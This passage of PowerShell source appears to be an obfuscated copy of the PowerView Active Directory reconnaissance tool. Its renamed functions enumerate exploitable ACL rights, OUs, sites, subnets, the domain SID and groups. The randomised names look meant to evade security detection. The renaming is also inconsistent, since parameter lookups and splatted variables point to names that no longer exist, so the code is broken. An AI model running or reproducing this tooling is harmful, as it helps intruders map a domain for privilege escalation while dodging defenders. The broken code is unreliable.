                        $bilhZaQq99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[upright] Error removing principal $($zbuvZXNF99.distinguishedname) '$PWeCyDaZ99' from $($pbpXWNuB99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function keynote {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $UtXBFQsM99,
        [Switch]
        $OCiVWNZU99,
        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $yiUNNNoG99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $ysXsGSOy99 = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $ysXsGSOy99['ResolveGUIDs'] = $OCiVWNZU99 }
        if ($PSBoundParameters['RightsFilter']) { $ysXsGSOy99['RightsFilter'] = $yiUNNNoG99 }
        if ($PSBoundParameters['LDAPFilter']) { $ysXsGSOy99['LDAPFilter'] = $WmhkcxXr99 }
        if ($PSBoundParameters['SearchBase']) { $ysXsGSOy99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $ysXsGSOy99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $ysXsGSOy99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $ysXsGSOy99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ysXsGSOy99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $ysXsGSOy99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $ysXsGSOy99['Credential'] = $fxunRYJT99 }
        $VXkGmKAT99 = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $VXkGmKAT99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $VXkGmKAT99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $VXkGmKAT99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VXkGmKAT99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $VXkGmKAT99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $VXkGmKAT99['Credential'] = $fxunRYJT99 }
        $tOXBGEQK99 = @{}
        if ($PSBoundParameters['Server']) { $tOXBGEQK99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['Credential']) { $tOXBGEQK99['Credential'] = $fxunRYJT99 }
        $pNzvquhx99 = @{}
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $ysXsGSOy99['Domain'] = $UtXBFQsM99
            $tOXBGEQK99['Domain'] = $UtXBFQsM99
        }
        cauliflowers @ACLArguments | ForEach-Object {
            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($pNzvquhx99[$_.SecurityIdentifier.Value]) {
                        $IBFQetpH99, $pNqmczhS99, $fvKMVbmH99, $PapdufQH99 = $pNzvquhx99[$_.SecurityIdentifier.Value]
                        $qVmqdIHE99 = New-Object PSObject
                        $qVmqdIHE99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $qVmqdIHE99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $qVmqdIHE99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $qVmqdIHE99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $qVmqdIHE99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $qVmqdIHE99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $qVmqdIHE99 | Add-Member NoteProperty 'AceType' $_.AceType
                        $qVmqdIHE99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $qVmqdIHE99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $qVmqdIHE99 | Add-Member NoteProperty 'IdentityReferenceName' $IBFQetpH99
                        $qVmqdIHE99 | Add-Member NoteProperty 'IdentityReferenceDomain' $pNqmczhS99
                        $qVmqdIHE99 | Add-Member NoteProperty 'IdentityReferenceDN' $fvKMVbmH99
                        $qVmqdIHE99 | Add-Member NoteProperty 'IdentityReferenceClass' $PapdufQH99
                        $qVmqdIHE99
                    }
                    else {
                        $fvKMVbmH99 = spokesmen -soGjewdO99 $_.SecurityIdentifier.Value -LkQAjVeR99 DN @ADNameArguments
                        if ($fvKMVbmH99) {
                            $pNqmczhS99 = $fvKMVbmH99.SubString($fvKMVbmH99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            $VXkGmKAT99['Domain'] = $pNqmczhS99
                            $VXkGmKAT99['Identity'] = $fvKMVbmH99
                            $Object = great @ObjectSearcherArguments
                            if ($Object) {
                                $IBFQetpH99 = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $PapdufQH99 = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $PapdufQH99 = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $PapdufQH99 = 'user'
                                }
                                else {
                                    $PapdufQH99 = $Null
                                }
                                $pNzvquhx99[$_.SecurityIdentifier.Value] = $IBFQetpH99, $pNqmczhS99, $fvKMVbmH99, $PapdufQH99
                                $qVmqdIHE99 = New-Object PSObject
                                $qVmqdIHE99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $qVmqdIHE99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $qVmqdIHE99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $qVmqdIHE99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $qVmqdIHE99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $qVmqdIHE99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $qVmqdIHE99 | Add-Member NoteProperty 'AceType' $_.AceType
                                $qVmqdIHE99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $qVmqdIHE99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $qVmqdIHE99 | Add-Member NoteProperty 'IdentityReferenceName' $IBFQetpH99
                                $qVmqdIHE99 | Add-Member NoteProperty 'IdentityReferenceDomain' $pNqmczhS99
                                $qVmqdIHE99 | Add-Member NoteProperty 'IdentityReferenceDN' $fvKMVbmH99
                                $qVmqdIHE99 | Add-Member NoteProperty 'IdentityReferenceClass' $PapdufQH99
                                $qVmqdIHE99
                            }
                        }
                        else {
                            Write-Warning "[keynote] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with spokesmen"
                        }
                    }
                }
            }
        }
    }
}
function joyridden {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $soGjewdO99,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $yrogLtqA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $nZWoutdh99,
        [Switch]
        $mIpZvziV99,
        [Alias('ReturnOne')]
        [Switch]
        $HyjxYAeb99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $sMQTvMNR99 = @{}
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Properties']) { $sMQTvMNR99['Properties'] = $rtPnFfWd99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['SecurityMasks']) { $sMQTvMNR99['SecurityMasks'] = $nZWoutdh99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        $QYWTzVHF99 = bleachers @SearcherArguments
    }
    PROCESS {
        if ($QYWTzVHF99) {
            $UztPqXyf99 = ''
            $bNYXjnRz99 = ''
            $soGjewdO99 | Where-Object {$_} | ForEach-Object {
                $hDkTAaiv99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($hDkTAaiv99 -match '^OU=.*') {
                    $UztPqXyf99 += "(distinguishedname=$hDkTAaiv99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $CBPYVhlj99 = $hDkTAaiv99.SubString($hDkTAaiv99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[joyridden] Extracted domain '$CBPYVhlj99' from '$hDkTAaiv99'"
                        $sMQTvMNR99['Domain'] = $CBPYVhlj99
                        $QYWTzVHF99 = bleachers @SearcherArguments
                        if (-not $QYWTzVHF99) {
                            Write-Warning "[joyridden] Unable to retrieve domain searcher for '$CBPYVhlj99'"
                        }
                    }
                }
                else {
                    try {
                        $ouzLqIgS99 = (-Join (([Guid]$hDkTAaiv99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $UztPqXyf99 += "(objectguid=$ouzLqIgS99)"
                    }
                    catch {
                        $UztPqXyf99 += "(name=$hDkTAaiv99)"
                    }
                }
            }
            if ($UztPqXyf99 -and ($UztPqXyf99.Trim() -ne '') ) {
                $bNYXjnRz99 += "(|$UztPqXyf99)"
            }
            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[joyridden] Searching for OUs with $yrogLtqA99 set in the gpLink property"
                $bNYXjnRz99 += "(gplink=*$yrogLtqA99*)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[joyridden] Using additional LDAP filter: $WmhkcxXr99"
                $bNYXjnRz99 += "$WmhkcxXr99"
            }
            $QYWTzVHF99.filter = "(&(objectCategory=organizationalUnit)$bNYXjnRz99)"
            Write-Verbose "[joyridden] joyridden filter string: $($QYWTzVHF99.filter)"
            if ($PSBoundParameters['FindOne']) { $mKhNNgkp99 = $QYWTzVHF99.FindOne() }
            else { $mKhNNgkp99 = $QYWTzVHF99.FindAll() }
            $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $OU = $_
                }
                else {
                    $OU = Johnson -rtPnFfWd99 $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($mKhNNgkp99) {
                try { $mKhNNgkp99.dispose() }
                catch {
                    Write-Verbose "[joyridden] Error disposing of the Results object: $_"
                }
            }
            $QYWTzVHF99.dispose()
        }
    }
}
function foundling {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $soGjewdO99,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $yrogLtqA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $nZWoutdh99,
        [Switch]
        $mIpZvziV99,
        [Alias('ReturnOne')]
        [Switch]
        $HyjxYAeb99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $sMQTvMNR99 = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Properties']) { $sMQTvMNR99['Properties'] = $rtPnFfWd99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['SecurityMasks']) { $sMQTvMNR99['SecurityMasks'] = $nZWoutdh99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        $EBHNmBji99 = bleachers @SearcherArguments
    }
    PROCESS {
        if ($EBHNmBji99) {
            $UztPqXyf99 = ''
            $bNYXjnRz99 = ''
            $soGjewdO99 | Where-Object {$_} | ForEach-Object {
                $hDkTAaiv99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($hDkTAaiv99 -match '^CN=.*') {
                    $UztPqXyf99 += "(distinguishedname=$hDkTAaiv99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $CBPYVhlj99 = $hDkTAaiv99.SubString($hDkTAaiv99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[foundling] Extracted domain '$CBPYVhlj99' from '$hDkTAaiv99'"
                        $sMQTvMNR99['Domain'] = $CBPYVhlj99
                        $EBHNmBji99 = bleachers @SearcherArguments
                        if (-not $EBHNmBji99) {
                            Write-Warning "[foundling] Unable to retrieve domain searcher for '$CBPYVhlj99'"
                        }
                    }
                }
                else {
                    try {
                        $ouzLqIgS99 = (-Join (([Guid]$hDkTAaiv99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $UztPqXyf99 += "(objectguid=$ouzLqIgS99)"
                    }
                    catch {
                        $UztPqXyf99 += "(name=$hDkTAaiv99)"
                    }
                }
            }
            if ($UztPqXyf99 -and ($UztPqXyf99.Trim() -ne '') ) {
                $bNYXjnRz99 += "(|$UztPqXyf99)"
            }
            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[foundling] Searching for sites with $yrogLtqA99 set in the gpLink property"
                $bNYXjnRz99 += "(gplink=*$yrogLtqA99*)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[foundling] Using additional LDAP filter: $WmhkcxXr99"
                $bNYXjnRz99 += "$WmhkcxXr99"
            }
            $EBHNmBji99.filter = "(&(objectCategory=site)$bNYXjnRz99)"
            Write-Verbose "[foundling] foundling filter string: $($EBHNmBji99.filter)"
            if ($PSBoundParameters['FindOne']) { $mKhNNgkp99 = $EBHNmBji99.FindAll() }
            else { $mKhNNgkp99 = $EBHNmBji99.FindAll() }
            $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Site = $_
                }
                else {
                    $Site = Johnson -rtPnFfWd99 $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($mKhNNgkp99) {
                try { $mKhNNgkp99.dispose() }
                catch {
                    Write-Verbose "[foundling] Error disposing of the Results object"
                }
            }
            $EBHNmBji99.dispose()
        }
    }
}
function teatime {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $soGjewdO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $DgPmuXLw99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $nZWoutdh99,
        [Switch]
        $mIpZvziV99,
        [Alias('ReturnOne')]
        [Switch]
        $HyjxYAeb99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $sMQTvMNR99 = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Properties']) { $sMQTvMNR99['Properties'] = $rtPnFfWd99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['SecurityMasks']) { $sMQTvMNR99['SecurityMasks'] = $nZWoutdh99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        $EXEmHiil99 = bleachers @SearcherArguments
    }
    PROCESS {
        if ($EXEmHiil99) {
            $UztPqXyf99 = ''
            $bNYXjnRz99 = ''
            $soGjewdO99 | Where-Object {$_} | ForEach-Object {
                $hDkTAaiv99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($hDkTAaiv99 -match '^CN=.*') {
                    $UztPqXyf99 += "(distinguishedname=$hDkTAaiv99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $CBPYVhlj99 = $hDkTAaiv99.SubString($hDkTAaiv99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[teatime] Extracted domain '$CBPYVhlj99' from '$hDkTAaiv99'"
                        $sMQTvMNR99['Domain'] = $CBPYVhlj99
                        $EXEmHiil99 = bleachers @SearcherArguments
                        if (-not $EXEmHiil99) {
                            Write-Warning "[teatime] Unable to retrieve domain searcher for '$CBPYVhlj99'"
                        }
                    }
                }
                else {
                    try {
                        $ouzLqIgS99 = (-Join (([Guid]$hDkTAaiv99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $UztPqXyf99 += "(objectguid=$ouzLqIgS99)"
                    }
                    catch {
                        $UztPqXyf99 += "(name=$hDkTAaiv99)"
                    }
                }
            }
            if ($UztPqXyf99 -and ($UztPqXyf99.Trim() -ne '') ) {
                $bNYXjnRz99 += "(|$UztPqXyf99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[teatime] Using additional LDAP filter: $WmhkcxXr99"
                $bNYXjnRz99 += "$WmhkcxXr99"
            }
            $EXEmHiil99.filter = "(&(objectCategory=subnet)$bNYXjnRz99)"
            Write-Verbose "[teatime] teatime filter string: $($EXEmHiil99.filter)"
            if ($PSBoundParameters['FindOne']) { $mKhNNgkp99 = $EXEmHiil99.FindOne() }
            else { $mKhNNgkp99 = $EXEmHiil99.FindAll() }
            $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $imKhNyit99 = $_
                }
                else {
                    $imKhNyit99 = Johnson -rtPnFfWd99 $_.Properties
                }
                $imKhNyit99.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')
                if ($PSBoundParameters['SiteName']) {
                    if ($imKhNyit99.properties -and ($imKhNyit99.properties.siteobject -like "*$DgPmuXLw99*")) {
                        $imKhNyit99
                    }
                    elseif ($imKhNyit99.siteobject -like "*$DgPmuXLw99*") {
                        $imKhNyit99
                    }
                }
                else {
                    $imKhNyit99
                }
            }
            if ($mKhNNgkp99) {
                try { $mKhNNgkp99.dispose() }
                catch {
                    Write-Verbose "[teatime] Error disposing of the Results object: $_"
                }
            }
            $EXEmHiil99.dispose()
        }
    }
}
function corrupter {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    $sMQTvMNR99 = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
    if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
    if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
    $DCSID = sensationalist @SearcherArguments -HyjxYAeb99 | Select-Object -First 1 -ExpandProperty objectsid
    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[corrupter] Error extracting domain SID for '$UtXBFQsM99'"
    }
}
function padlocks {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $soGjewdO99,
        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $YYXFGcar99,
        [Switch]
        $FyhdEdUY99,
        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $doMFLUHs99,
        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $ouHijLWf99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $nZWoutdh99,
        [Switch]
        $mIpZvziV99,
        [Alias('ReturnOne')]
        [Switch]
        $HyjxYAeb99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $sMQTvMNR99 = @{}
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Properties']) { $sMQTvMNR99['Properties'] = $rtPnFfWd99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['SecurityMasks']) { $sMQTvMNR99['SecurityMasks'] = $nZWoutdh99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        $eSIRuQap99 = bleachers @SearcherArguments
    }
    PROCESS {
        if ($eSIRuQap99) {
            if ($PSBoundParameters['MemberIdentity']) {
                if ($sMQTvMNR99['Properties']) {
                    $AFsRDrHH99 = $sMQTvMNR99['Properties']
                }
                $sMQTvMNR99['Identity'] = $YYXFGcar99
                $sMQTvMNR99['Raw'] = $True
                great @SearcherArguments | ForEach-Object {
                    $khQeLecU99 = $_.GetDirectoryEntry()
                    $khQeLecU99.RefreshCache('tokenGroups')
                    $khQeLecU99.TokenGroups | ForEach-Object {
                        $aFyvxhjk99 = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                        if ($aFyvxhjk99 -notmatch '^S-1-5-32-.*') {
                            $sMQTvMNR99['Identity'] = $aFyvxhjk99
                            $sMQTvMNR99['Raw'] = $False
                            if ($AFsRDrHH99) { $sMQTvMNR99['Properties'] = $AFsRDrHH99 }
                            $Group = great @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $UztPqXyf99 = ''
                $bNYXjnRz99 = ''
                $soGjewdO99 | Where-Object {$_} | ForEach-Object {
                    $hDkTAaiv99 = $_.Replace('(', '\28').Replace(')', '\29')
